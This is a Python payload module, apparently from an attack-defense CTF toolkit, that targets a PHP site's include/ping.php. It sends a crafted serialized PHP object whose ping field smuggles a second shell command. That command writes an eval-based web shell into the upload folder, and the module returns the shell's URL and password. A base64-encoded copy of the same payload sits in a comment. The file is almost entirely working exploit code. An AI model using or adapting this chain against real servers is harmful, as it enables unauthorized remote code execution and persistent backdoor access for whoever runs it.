'''
This is a default payload
if there is a backdoor in upload/upload.php,and key is pass
The real situation is much more complex
'''
import sys
import base64
sys.path.append('..')
from models.payload import Payload,PayloadFailException
import requests
from models.horse import Horse
from utils import Utils
from configuration import configuration


class P(Payload):
    def attack(self):
        try:
            url = 'http://{0}/include/ping.php'.format(self.host)
            shell = '<?php @eval($_POST[c]);?>'
            cmd = '127.0.0.1 -c 1&&echo {} | base64 -d > {}/upload/aa.php'.format(Utils.base64(shell),configuration.webRoot)
            payload = 'O:5:"getip":1:{s:2:"ip";O:9:"getresult":2:{s:3:"obj";O:4:"ping":1:{s:8:"\x00ping\x00ip";s:'+str(len(cmd))+':"'+cmd+'";}s:2:"ip";s:9:"127.0.0.1";}}'
            res = requests.get(url,params={
                'ip':Utils.base64(payload)
            },timeout=2)
            # res = requests.get(url,params={
            #     'ip':'Tzo1OiJnZXRpcCI6MTp7czoyOiJpcCI7Tzo5OiJnZXRyZXN1bHQiOjI6e3M6Mzoib2JqIjtPOjQ6InBpbmciOjE6e3M6ODoiAHBpbmcAaXAiO3M6MTAwOiIxMjcuMC4wLjEgLWMgMSYmZWNobyBQRDl3YUhBZ1FHVjJZV3dvSkY5UVQxTlVXMk5kS1RzL1BnPT0gfCBiYXNlNjQgLWQgPj4gL3Zhci93d3cvaHRtbC91cGxvYWQvYWEucGhwIjt9czoyOiJpcCI7czo5OiIxMjcuMC4wLjEiO319'
            # },timeout=2)
            url2 = 'http://{0}/upload/aa.php'.format(self.host)
            if res.status_code == 200:
                return url2,'c'
            else:
                raise PayloadFailException
        except:
            raise PayloadFailException